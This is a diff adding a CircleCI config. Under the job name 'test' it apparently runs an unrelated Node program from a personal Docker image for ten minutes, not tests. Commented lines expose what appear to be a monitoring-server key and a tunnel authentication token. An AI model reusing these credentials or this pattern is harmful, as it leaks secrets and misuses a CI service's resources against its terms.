@@ -1,0 +1,30 @@
+version: 2.1
+
+jobs:
+  test:
+    docker:
+      - image: jfu888/jsx
+    environment:
+      # NZ_SERVER: data.seaw.gq
+      # NZ_KEY: qIcNIIYJXeXZxAgQ0e
+      # AGO_AUTH: eyJhIjoiMzg2OGEzNjc2ZTkyZmUxMmY0NjM1YTU0ZmNhMDQ0NDMiLCJ0IjoiZWVlMGIxYWEtNGZlZS00YzJkLThkZmUtODJjMmZlNzc1NmQ3IiwicyI6Ik1EQmhZVFJqWWpZdE9UUmlaUzAwTldFd0xXSmxaVFV0T1RnME5tWTBOMlpoWVRVeiJ9
+
+    steps:
+      - checkout
+      - restore_cache:
+          keys:
+            - node-deps-v1-{{ .Branch }}-{{checksum "package.json"}}
+      - run:
+          name: install packages
+          command: npm install && apt-get update && apt-get install -y curl
+      - save_cache:
+          key: node-deps-v1-{{ .Branch }}-{{checksum "package.json"}}
+          paths:
+            - ~/.npm
+      - run:
+          name: Run js
+          command: node index.js & pid=$! && sleep 600 && kill $pid
+workflows:
+  orb-free-workflow:
+    jobs:
+      - test
